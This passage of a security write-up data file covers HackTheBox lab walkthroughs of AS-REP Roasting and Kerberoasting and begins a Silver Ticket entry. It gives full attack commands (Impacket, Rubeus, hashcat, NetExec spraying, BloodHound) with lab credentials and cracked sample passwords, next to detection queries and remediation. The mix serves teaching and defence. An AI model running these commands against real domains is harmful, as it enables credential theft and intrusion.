          '$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f…$3a78f…c2:Welcome1',
      },
      {
        title: 'Step 6 — Validate the recovered credential',
        description:
          'Confirm the cracked password actually authenticates and check what the user can reach. CrackMapExec or netexec is perfect for this sweep.',
        commands: [
          'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
          'nxc ldap 10.10.10.161 -u mmorgan -p Welcome1 --groups',
        ],
      },
      {
        title: 'Step 7 — Pivot: BloodHound from the new identity',
        description:
          'Feed the new credentials to BloodHound to find a path from mmorgan → Domain Admins. AS-REP cracks frequently land on service or stale accounts with hidden privileges.',
        commands: [
          'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'List users with PreAuth disabled (LDAP filter)', command: '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' },
      { title: 'PowerView — find roastable users', command: 'Get-DomainUser -PreauthNotRequired | select samaccountname,distinguishedname' },
      { title: 'Impacket — unauth roast with userlist', command: 'GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <DC_IP> DOMAIN/' },
      { title: 'Impacket — authed roast (auto-discover)', command: 'GetNPUsers.py -request -dc-ip <DC_IP> DOMAIN/user:pass' },
      { title: 'Rubeus — asreproast Hashcat format', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt' },
      { title: 'Hashcat — crack AS-REP (etype 23)', command: 'hashcat -m 18200 asrep.txt rockyou.txt --force' },
      { title: 'John the Ripper', command: 'john --format=krb5asrep --wordlist=rockyou.txt asrep.txt' },
      { title: 'Validate creds with NetExec', command: 'nxc smb <DC_IP> -u <user> -p <pass>' },
      { title: 'Disable PreAuth (attacker test, do not run in prod)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $true' },
      { title: 'Re-enable PreAuth (remediation)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false' },
    ],
    commandExplanations: [
      {
        command: 'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Pull every user object from Active Directory over LDAP/SAMR using known low-priv credentials.',
        breakdown: [
          { flag: '-all', meaning: 'Return every user (otherwise only one).' },
          { flag: '-dc-ip', meaning: 'Force the query at this DC IP, bypassing DNS.' },
          { flag: 'DOMAIN/user:pass', meaning: 'Authenticated bind as htb-student to read the directory.' },
        ],
        why: 'AS-REP Roasting needs valid sAMAccountNames. Without a username list the KDC silently drops AS-REQs. GetADUsers gives the authoritative source — straight from the DC.',
      },
      {
        command: 'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
        purpose: 'Spray Kerberos AS-REQ packets without pre-auth for each username and capture any AS-REP returned.',
        breakdown: [
          { flag: '-no-pass', meaning: 'Skip the password prompt — fully unauthenticated.' },
          { flag: '-usersfile', meaning: 'Candidate usernames from a file, one per line.' },
          { flag: 'DOMAIN/', meaning: 'Trailing slash means "no user" — anonymous bind.' },
        ],
        why: 'The actual roast. Any account flagged DONT_REQ_PREAUTH (UAC 0x400000) returns an AS-REP whose encrypted blob is derived from its NT hash — crackable offline.',
      },
      {
        command: 'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Authenticated auto-discovery — let Impacket query LDAP itself for roastable users, then roast them.',
        breakdown: [
          { flag: '-request', meaning: 'After enumeration, actually request the AS-REP and dump the hash.' },
          { flag: '-outputfile', meaning: 'Save in $krb5asrep$23$ format ready for hashcat.' },
        ],
        why: 'Faster and stealthier than -usersfile because we skip the loud anonymous spray; we read DONT_REQ_PREAUTH directly from LDAP and only hit the KDC for known-vulnerable accounts.',
      },
      {
        command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
        purpose: "Native Windows AS-REP Roasting from a domain-joined foothold using the host's Kerberos APIs.",
        breakdown: [
          { flag: 'asreproast', meaning: 'Rubeus action — auto-discover roastable users via LDAP and request AS-REPs.' },
          { flag: '/format:hashcat', meaning: 'Emit hashes in the $krb5asrep$23$ format hashcat -m 18200 expects.' },
          { flag: '/outfile', meaning: 'Persist hashes for offline cracking.' },
        ],
        why: 'On a Windows beachhead Rubeus is the right tool — no Python / Impacket dependency, runs in-memory via C2, and the traffic looks like normal Kerberos.',
      },
      {
        command: 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
        purpose: 'Crack the captured AS-REP blob offline against a wordlist.',
        breakdown: [
          { flag: '-m 18200', meaning: 'Hash mode for Kerberos AS-REP etype 23 (RC4-HMAC).' },
          { flag: '--force', meaning: 'Bypass GPU/driver warnings (lab use only).' },
        ],
        why: 'The encrypted AS-REP is RC4(NTLM(password)). Hashcat tries every word, derives the NT hash, encrypts a known plaintext, and matches — fully offline so the DC never sees it.',
      },
      {
        command: 'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
        purpose: 'Validate the cracked credential against SMB on the DC and enumerate access.',
        breakdown: [
          { flag: 'smb', meaning: 'NetExec protocol module.' },
          { flag: '-u / -p', meaning: 'Username / cleartext password to authenticate.' },
        ],
        why: 'A cracked hash is worthless until proven. NetExec confirms login, prints if the user is admin, and is the springboard for ldap/winrm/mssql sweeps.',
      },
      {
        command: 'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
        purpose: 'Collect AD trust, group, and ACL data as the new identity to plot a path to Domain Admins.',
        breakdown: [
          { flag: '-c All', meaning: 'Run every collection method (Group, ACL, Trusts, Sessions, LocalAdmin, ...).' },
          { flag: '-ns', meaning: 'Use the DC as DNS resolver to avoid lookup failures from the attacker host.' },
        ],
        why: 'Roasted accounts are usually stale or service identities sitting on hidden privileges. BloodHound turns the new credential into a graph and finds the attack path automatically.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — GetADUsers.py', category: 'AD Enumeration', purpose: 'Read user objects from a DC over LDAP/SAMR.', why: 'Pure Python, no agent, runs from Linux. Generates the username list every other Impacket script consumes.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — GetNPUsers.py', category: 'Credential Access', purpose: 'Send AS-REQ without pre-auth and capture AS-REP hashes.', why: 'The de-facto Linux AS-REP Roasting tool. Supports unauth (-usersfile) and authed (-request) modes.', link: 'https://github.com/fortra/impacket' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Kerberos abuse from a Windows host (asreproast, kerberoast, S4U, PTT).', why: "Uses the host's native Kerberos APIs so it blends with normal traffic and runs in-memory from C2 frameworks.", link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'PowerView', category: 'AD Recon', purpose: 'PowerShell module for AD enumeration.', why: 'One-liner Get-DomainUser -PreauthNotRequired surfaces every roastable account from a logged-in Windows session.', link: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'hashcat', category: 'Offline Cracking', purpose: 'GPU-accelerated password recovery.', why: 'Mode 18200 is purpose-built for AS-REP RC4 blobs; orders of magnitude faster than CPU.', link: 'https://hashcat.net/hashcat/' },
      { name: 'John the Ripper', category: 'Offline Cracking', purpose: 'CPU password cracker with rich rule engine.', why: 'Useful when no GPU is available or for advanced --rules mutations.', link: 'https://www.openwall.com/john/' },
      { name: 'NetExec (nxc)', category: 'Validation / Lateral Movement', purpose: 'Mass auth, enumeration and command execution across SMB/LDAP/WinRM/MSSQL.', why: 'CrackMapExec successor — quickly validates cracked creds and maps where they grant access.', link: 'https://www.netexec.wiki/' },
      { name: 'BloodHound', category: 'Attack Path Mapping', purpose: 'Graph AD relationships and surface attack paths to high-value targets.', why: 'Turns a single cracked password into a Domain Admin route by visualising ACLs, groups, and sessions.', link: 'https://bloodhound.specterops.io/' },
      { name: 'kerbrute', category: 'Username Enumeration', purpose: 'Validate AD usernames at high speed via Kerberos pre-auth responses.', why: 'When credentials are unknown, kerbrute confirms which usernames exist before roasting — no lockout risk.', link: 'https://github.com/ropnop/kerbrute' },
    ],
    enumerationDetection: [
      {
        title: 'LDAP enumeration of UserAccountControl bits (DONT_REQ_PREAUTH lookup)',
        description: 'Attackers query LDAP with the bitwise filter (userAccountControl:1.2.840.113556.1.4.803:=4194304) to find roastable accounts. Almost never used by legitimate apps — high-fidelity signal.',
        eventIds: ['1644 (LDAP query logging)', '4662 (Directory Service Access)'],
        dataSource: 'Domain Controller — Directory Service Access auditing',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 1644\n| where SearchFilter has "1.2.840.113556.1.4.803:=4194304"\n| summarize Count=count() by Computer, ClientIPAddress, Account, bin(TimeGenerated, 5m)\n| where Count > 0',
        severity: 'High',
      },
      {
        title: 'SAMR / LDAP bulk user enumeration (GetADUsers, ldapsearch -all)',
        description: 'A single low-priv account pulling the entire user list at once is a classic recon tell. Baseline normal reads vs. bulk dumps.',
        eventIds: ['4662', '5145 (SMB IPC$ to samr)'],
        dataSource: 'DC Security log + SMB auditing',
        queryLanguage: 'SPL',
        query: 'index=wineventlog EventCode=5145 RelativeTargetName="samr"\n| stats dc(Account_Name) as users, count by src_ip, Account_Name\n| where count > 50',
        severity: 'Medium',
      },
      {
        title: 'Kerbrute-style username spraying',
        description: 'High volume of 4768 with Result Code 0x6 (client unknown) from one IP = username brute. Switch to 0x0 results = valid usernames identified.',
        eventIds: ['4768'],
        dataSource: 'Domain Controller Security log',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| summarize Unknown=countif(ResultCode == "0x6"), Valid=countif(ResultCode == "0x0") by IpAddress, bin(TimeGenerated, 1m)\n| where Unknown > 30',
        severity: 'High',
      },
    ],
    socDetection: [
      {
        title: 'Canonical AS-REP Roast — 4768 with PreAuthType 0',
        description: 'Every AS-REP Roast must produce Event 4768 on the DC where PreAuthType=0 and Ticket Encryption Type=0x17 (RC4). Highest-fidelity signal — virtually no false positives in an AES-only environment.',
        eventIds: ['4768'],
        dataSource: 'Domain Controller — Audit Kerberos Authentication Service (Success)',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| where PreAuthType == "0"\n| where TicketEncryptionType == "0x17"\n| project TimeGenerated, TargetUserName, IpAddress, Computer, TicketEncryptionType, PreAuthType\n| sort by TimeGenerated desc',
        severity: 'Critical',
      },
      {
        title: 'Single source IP, many target accounts (mass roast)',
        description: 'Healthy users only request TGTs for themselves. One source asking for 4768s on dozens of accounts in minutes = automated roasting (GetNPUsers / Rubeus).',
        eventIds: ['4768'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        query: 'index=wineventlog EventCode=4768 PreAuthType=0\n| stats dc(TargetUserName) as targets, values(TargetUserName) as users by IpAddress, bin(_time, 5m)\n| where targets >= 5',
        severity: 'High',
      },
      {
        title: 'Honey account trip-wire',
        description: 'Provision a never-used AD account with DONT_REQ_PREAUTH set and a 30-character random password. Any 4768 referencing it = active attacker, zero false positive.',
        eventIds: ['4768'],
        dataSource: 'DC Security log',
        queryLanguage: 'KQL',
        query: 'SecurityEvent\n| where EventID == 4768\n| where TargetUserName == "svc-honey-asrep"\n| project TimeGenerated, IpAddress, Computer',
        severity: 'Critical',
      },
      {
        title: 'Offensive tool execution on endpoints (Rubeus / GetNPUsers)',
        description: "Catch the attacker's tool before the DC sees the request. Look for asreproast keywords in command lines and Python interpreters spawning Impacket modules.",
        eventIds: ['Sysmon 1', '4688'],
        dataSource: 'Endpoint EDR / Sysmon',
        queryLanguage: 'KQL',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("asreproast","GetNPUsers","kerbrute userenum")\n   or (InitiatingProcessFileName in~ ("python.exe","python3","rubeus.exe")\n       and ProcessCommandLine has "asrep")',
        severity: 'High',
      },
      {
        title: 'RC4 Kerberos use in an AES-only environment',
        description: 'If GPO disables RC4, any 4768/4769 with TicketEncryptionType 0x17 is anomalous and likely an attacker forcing downgrade for roasting/kerberoasting.',
        eventIds: ['4768', '4769'],
        dataSource: 'DC Security log',
        queryLanguage: 'SPL',
        query: 'index=wineventlog (EventCode=4768 OR EventCode=4769) TicketEncryptionType=0x17\n| stats count by TargetUserName, IpAddress, EventCode',
        severity: 'High',
      },
    ],
    detection: [
      'Windows Event 4768 with PreAuthType = 0 and Ticket Encryption Type 0x17 — the canonical roast signal.',
      'Spike in 4768 from a single source IP across many accounts in a short window.',
      'Honey accounts: decoy user with PreAuth disabled triggers on ANY 4768.',
      'Sysmon Event 3 (network connect) to TCP/88 from non-admin hosts.',
      'EDR detection of Rubeus.exe / GetNPUsers.py / kerbrute command-line patterns.',
      'LDAP audit (Event 1644) for the userAccountControl bitmask filter 4194304.',
    ],
    mitigation: [
      'Audit Active Directory weekly: list every account with DONT_REQ_PREAUTH (UAC 0x400000) and re-enable pre-auth.',
      'Enforce strong password policy (>= 14 chars, complexity, banned-words list) for any account that legitimately must keep PreAuth disabled.',
      'Disable RC4 (etype 23) Kerberos encryption — force AES-128/256 only via GPO "Network security: Configure encryption types allowed for Kerberos".',
      'Privileged accounts go in the Protected Users group — automatically blocks RC4 and disables NTLM/Digest.',
      'Tier-0 administrative model: domain admins never used for daily logon; isolate from workstations.',
      'Continuous attack-surface monitoring with PingCastle / Purple Knight for the DONT_REQ_PREAUTH finding.',
    ],
    remediation: [
      'Identify all roastable accounts: Get-ADUser -Filter \'UserAccountControl -band 4194304\'.',
      'Re-enable PreAuth on each: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.',
      'Force a password reset on every account whose hash may have been captured.',
      'Reset krbtgt twice (10-hour gap) if AS-REPs may have been used to mint TGTs offline.',
      'Rotate any service-account passwords matching the cracked one (password reuse hunt).',
      'Push GPO disabling RC4 etypes domain-wide and validate with klist on a test host.',
      'Add the source IP to the firewall blocklist and pull 90 days of 4768 logs for hunt.',
      'File an Azure AD / Entra Conditional Access policy requiring MFA for any sync-back of the affected identity.',
    ],
    mitre: [
      { id: 'T1558.004', name: 'AS-REP Roasting', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (GetNPUsers.py)', 'Rubeus', 'PowerView', 'hashcat', 'John the Ripper', 'NetExec / CrackMapExec', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Active Directory Enumeration & Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.004', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { title: 'Microsoft — Kerberos Pre-Authentication', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/preventing-open-network-sharing' },
      { title: 'Hashcat mode 18200 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
    ],
  },
  // ======================= KERBEROASTING =======================
  {
    id: 'ad-kerberoasting',
    slug: 'ad-kerberoasting',
    name: 'Kerberoasting — Cracking Service Account TGS Tickets',
    shortName: 'Kerberoasting',
    category: 'Credential Access',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-05',
    author: 'Ahmed Tareq',
    readingTime: 14,
    labProvider: 'HackTheBox',
    labName: 'Kerberoasting — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adKerberoastHero,
    summary:
      'Kerberoasting abuses a legitimate Kerberos feature: any authenticated domain user can request a TGS ticket for any account that has a Service Principal Name (SPN). The TGS is encrypted with the service account\'s NT hash, so an attacker can crack it offline — without ever touching the target service or triggering a lockout.',
    prerequisites: [
      'Any low-privileged domain user (no admin rights needed).',
      'Network reach to the Domain Controller on TCP/UDP 88 (Kerberos).',
      'Linux box with Impacket OR a Windows foothold with Rubeus / PowerView.',
      'hashcat or john for offline cracking, plus a wordlist (rockyou.txt + rules).',
    ],
    attackFlow: [
      'Authenticate to the domain as any user (or relay creds).',
      'Enumerate accounts where servicePrincipalName attribute is set.',
      'Request a TGS-REQ for each SPN — the KDC returns TGS encrypted with the service account NT hash.',
      'Extract the encrypted blob in $krb5tgs$23$ format (RC4 etype is the cracking sweet-spot).',
      'Crack offline with hashcat -m 13100 against rockyou + rules.',
      'Use the recovered service-account password to pivot, often with high privileges.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate SPNs in the domain',
        description:
          'A Service Principal Name (SPN) ties an account to a service (MSSQLSvc/sql01.htb:1433, HTTP/web01, etc). Any account with an SPN can be Kerberoasted. We pull them with GetUserSPNs.py — fast, unauth-friendly with creds, and gives us the full list before we make any noisy requests.',
        commands: [
          'GetUserSPNs.py -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output: 'ServicePrincipalName       Name      MemberOf\n--------------------------  --------  -----------------------------------\nMSSQLSvc/sql01.htb:1433     sqlsvc    CN=Domain Admins,CN=Users,DC=...\nHTTP/web01                  websvc    CN=Service Accounts,...',
        image: { src: adKerberoastFlow, caption: 'Kerberos TGS-REQ flow — the KDC encrypts the TGS with the service account NT hash.' },
      },
      {
        title: 'Step 2 — Request TGS tickets for every SPN',
        description:
          'Adding -request makes Impacket actually send the TGS-REQ for each SPN found. The KDC returns one TGS per service, encrypted with that service account\'s NT hash. We force RC4 (etype 23) where possible because it cracks orders-of-magnitude faster than AES.',
        commands: [
          'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$3a8c...$f2b1...c9',
      },
      {
        title: 'Step 3 — Roast natively from a Windows foothold (Rubeus)',
        description:
          'On a Windows beachhead, Rubeus uses the host\'s own Kerberos APIs which blends with normal traffic. The /nowrap flag prevents line-wrapping that would corrupt the hash for hashcat.',
        commands: [
          'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
          'Rubeus.exe kerberoast /user:sqlsvc /domain:INLANEFREIGHT.LOCAL /nowrap',
        ],
      },
      {
        title: 'Step 4 — Crack the TGS hash offline',
        description:
          'Mode 13100 is purpose-built for Kerberos 5 TGS-REP etype 23. Combine rockyou with the d3ad0ne/OneRule rule-set and you\'ll catch every weak service password in minutes on a single GPU.',
        commands: [
          'hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs_hashes.txt',
        ],
        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$...:Summer2024!',
      },
      {
        title: 'Step 5 — Pivot with the cracked service account',
        description:
          'Service accounts are notoriously over-privileged (DBAs put them in Domain Admins). Use the new creds with NetExec to spray the domain, then BloodHound the path to DA.',
        commands: [
          'nxc smb 10.10.10.0/24 -u sqlsvc -p \'Summer2024!\'',
          'bloodhound-python -u sqlsvc -p \'Summer2024!\' -d inlanefreight.local -ns 10.10.10.161 -c All',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — list SPNs', command: 'GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC>' },
      { title: 'Impacket — request + dump', command: 'GetUserSPNs.py -request -outputfile tgs.txt DOMAIN/user:pass -dc-ip <DC>' },
      { title: 'Rubeus — kerberoast all', command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap' },
      { title: 'Hashcat — crack TGS (etype 23)', command: 'hashcat -m 13100 tgs.txt rockyou.txt -r d3ad0ne.rule --force' },
      { title: 'PowerView — Get-DomainSPNTicket', command: 'Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Out-File tgs.txt' },
    ],
    commandExplanations: [
      {
        command: 'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
        purpose: 'Enumerate every SPN in the domain and immediately request a TGS for each one, dumping crackable hashes.',
        breakdown: [
          { flag: '-request', meaning: 'After enumeration, send the TGS-REQ and capture the encrypted ticket.' },
          { flag: '-outputfile', meaning: 'Write hashes in $krb5tgs$23$ format ready for hashcat -m 13100.' },
          { flag: '-dc-ip', meaning: 'Target Domain Controller IP — required when DNS isn\'t pointing at the DC.' },
          { flag: 'DOMAIN/user:pass', meaning: 'Authentication context — Kerberoasting requires any valid domain user.' },
        ],
        why: 'This is the canonical one-shot Kerberoast: it does the LDAP enumeration and TGS request in a single authenticated session, so one network burst = full hash dump.',
      },
      {
        command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
        purpose: 'Native Windows Kerberoasting from a domain-joined beachhead — auto-discovers every roastable account.',
        breakdown: [
          { flag: 'kerberoast', meaning: 'Rubeus action — LDAP-search SPN-bearing accounts then request TGS for each.' },
          { flag: '/outfile:tgs.txt', meaning: 'Persist hashes to disk for offline cracking.' },
          { flag: '/nowrap', meaning: 'Disable line-wrapping so the long hash stays a single line (otherwise hashcat will reject it).' },
        ],
        why: 'Rubeus uses the host\'s built-in Kerberos APIs, so the TGS-REQ traffic is indistinguishable from a legitimate user accessing services — much stealthier than Impacket from off-net.',
      },
      {
        command: 'hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
        purpose: 'GPU-crack the captured TGS-REP RC4 hash against a wordlist with mutation rules.',
        breakdown: [
          { flag: '-m 13100', meaning: 'Hash-mode for Kerberos 5 TGS-REP etype 23 (RC4-HMAC).' },
          { flag: '-r d3ad0ne.rule', meaning: 'Apply 30k+ password mutation rules (capitalisations, leet, year-suffixes).' },
          { flag: '--force', meaning: 'Skip OpenCL warnings on VMs / odd GPUs.' },
        ],
        why: 'The TGS-REP is RC4(NT-hash(password)). Hashcat tries each candidate, derives its NT hash, encrypts a known plaintext and compares — no traffic, no lockout, just GPU cycles.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — GetUserSPNs.py', category: 'Credential Access', purpose: 'Enumerate SPNs and pull TGS hashes from Linux.', why: 'Single-binary, scriptable, the de-facto Kerberoasting tool in HTB labs and real engagements.', link: 'https://github.com/fortra/impacket' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Kerberoast natively from a Windows host.', why: 'Uses the host Kerberos stack so traffic blends in; runs in-memory from C2.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'PowerView', category: 'AD Recon', purpose: 'AD enumeration & SPN ticket grabbing in PowerShell.', why: 'Living-off-the-land alternative when binaries are blocked by AppLocker.', link: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'hashcat', category: 'Offline Cracking', purpose: 'GPU password recovery.', why: 'Mode 13100 is purpose-built for TGS-REP etype 23 — fastest path to plaintext.', link: 'https://hashcat.net/hashcat/' },
      { name: 'NetExec (CrackMapExec)', category: 'Lateral Movement', purpose: 'Spray cracked creds across the domain.', why: 'Validates whether the cracked service password unlocks SMB / WinRM / MSSQL on hundreds of hosts in one command.', link: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Map graph-based attack paths.', why: 'Once you own the service account, BloodHound shows the shortest path to Domain Admin.', link: 'https://bloodhound.specterops.io' },
    ],
    enumerationDetection: [
      {
        title: 'LDAP burst querying servicePrincipalName',
        description: 'Kerberoasting always starts with an LDAP search filtering on (servicePrincipalName=*). Domain Controllers log this in 1644 (LDAP search statistics, must be enabled via the registry/GPO).',
        eventIds: ['1644'],
        dataSource: 'Domain Controller — Directory Services log',
        queryLanguage: 'KQL',
        severity: 'Medium',
        query: 'Event\n| where Source == "Microsoft-Windows-ActiveDirectory_DomainService" and EventID == 1644\n| where RenderedDescription has "servicePrincipalName"\n| summarize count() by Account=tostring(parse_xml(EventData).EventData.Data[2]), bin(TimeGenerated, 5m)\n| where count_ > 5',
      },
      {
        title: 'Suspicious tooling on endpoints',
        description: 'Catch the offensive tool before the DC sees the TGS-REQ. Look for Rubeus / GetUserSPNs / Invoke-Kerberoast strings in command lines and PowerShell ScriptBlock logs.',
        eventIds: ['4688', '4104'],
        dataSource: 'Endpoint — Sysmon / Defender ATP',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("kerberoast","GetUserSPNs","Invoke-Kerberoast","Rubeus.exe")\n   or (InitiatingProcessFileName in~ ("python.exe","python3","powershell.exe")\n       and ProcessCommandLine has_any ("kerberoast","SPN"))',
      },
    ],
    socDetection: [
      {
        title: 'Canonical Kerberoast — 4769 with Ticket Encryption 0x17',
        description: 'When an account requests many TGS tickets in a short window AND ticket encryption is RC4 (0x17), it is almost always Kerberoasting. Modern domains negotiate AES (0x12) — RC4 today is a red flag.',
        eventIds: ['4769'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'SecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == "0x17"  // RC4\n| where ServiceName !endswith "$" and ServiceName != "krbtgt"\n| summarize tickets=count(), services=make_set(ServiceName) by Account=TargetUserName, IpAddress, bin(TimeGenerated, 10m)\n| where tickets >= 5',
      },
      {
        title: 'Honey-SPN trip-wire',
        description: 'Create a decoy account with an enticing SPN (MSSQLSvc/finance-db.corp.local) and a 64-char random password. Any 4769 against this account = guaranteed attacker. Zero false positives.',
        eventIds: ['4769'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'SPL',
        severity: 'Critical',
        query: 'index=wineventlog EventCode=4769 Service_Name="svc-honey-mssql"\n| stats count by Account_Name, Client_Address, Ticket_Encryption_Type',
      },
      {
        title: 'TGS request volume anomaly',
        description: 'Baseline normal TGS-REQ rate per user. A single account requesting >20 distinct SPN tickets in 10 minutes is statistically anomalous and warrants a Tier-2 investigation.',
        eventIds: ['4769'],
        dataSource: 'SIEM correlation',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4769\n| bucket _time span=10m\n| stats dc(Service_Name) as unique_spns by Account_Name, _time\n| where unique_spns > 20',
      },
    ],
    detection: [
      'Alert on Event 4769 where Ticket Encryption Type = 0x17 (RC4) for non-machine accounts.',
      'Deploy honey-SPN accounts — any 4769 against them is a guaranteed attack.',
      'Threshold rule: single user requesting >10 distinct SPN tickets in 10 minutes.',
      'Process telemetry for Rubeus.exe, GetUserSPNs.py, Invoke-Kerberoast.ps1.',
      'PowerShell ScriptBlock 4104 containing "kerberoast" or "Get-DomainSPNTicket".',
    ],
    mitigation: [
      'Use Group Managed Service Accounts (gMSA) — auto-rotated 240-char passwords, uncrackable.',
      'Force AES-only Kerberos: set msDS-SupportedEncryptionTypes = 0x18 on every service account.',
      'Length, not complexity: every service account password ≥ 25 random characters.',
      'Audit and remove SPNs from privileged accounts (no Domain Admin should ever have an SPN).',
      'Enable Microsoft Defender for Identity / ATA — it baselines TGS behaviour automatically.',
    ],
    remediation: [
      'Identify every cracked service account, force-reset and rotate every system that uses it.',
      'Enumerate all SPN-bearing accounts (Get-ADUser -Filter \'servicePrincipalName -like "*"\') and migrate to gMSA.',
      'Pull 90 days of 4769 logs and hunt for prior RC4 TGS bursts from the same source IP.',
      'Reset krbtgt twice (10-hour gap) if the cracked account had Domain Admin to invalidate any Golden Tickets.',
      'Deploy a permanent honey-SPN and wire the alert into the on-call paging policy.',
    ],
    mitre: [
      { id: 'T1558.003', name: 'Kerberoasting', url: 'https://attack.mitre.org/techniques/T1558/003/' },
      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (GetUserSPNs.py)', 'Rubeus', 'PowerView', 'Invoke-Kerberoast', 'hashcat', 'John the Ripper', 'NetExec', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Kerberoasting', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.003', url: 'https://attack.mitre.org/techniques/T1558/003/' },
      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
      { title: 'Hashcat mode 13100 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
    ],
  },
  // ======================= SILVER TICKET =======================
  {
    id: 'ad-silver-ticket',
    slug: 'ad-silver-ticket',
    name: 'Silver Ticket — Forging Service Tickets with a Stolen NT Hash',
    shortName: 'Silver Ticket',
    category: 'Persistence',
    severity: 'Critical',
    difficulty: 'Hard',
    publishedAt: '2025-05-08',
    author: 'Ahmed Tareq',
    readingTime: 13,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Attacks — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adSilverTicketHero,
    summary:
      'A Silver Ticket is a forged Kerberos TGS encrypted with a service account\'s NT hash. Because the target service trusts any TGS it can decrypt, the attacker bypasses the KDC entirely — no AS-REQ, no TGS-REQ, no DC log. With one stolen hash an attacker can impersonate any user (even fake Domain Admins) against that single service for as long as the password lives.',
    prerequisites: [
      'NTLM hash (or AES key) of a service account — usually obtained via Kerberoasting, DCSync, or LSASS dump.',
      'The target service\'s SPN (e.g. cifs/fileserver01.htb, MSSQLSvc/db01.htb:1433).',
      'The domain SID (S-1-5-21-...) — pulled with whoami /user or PowerView.',
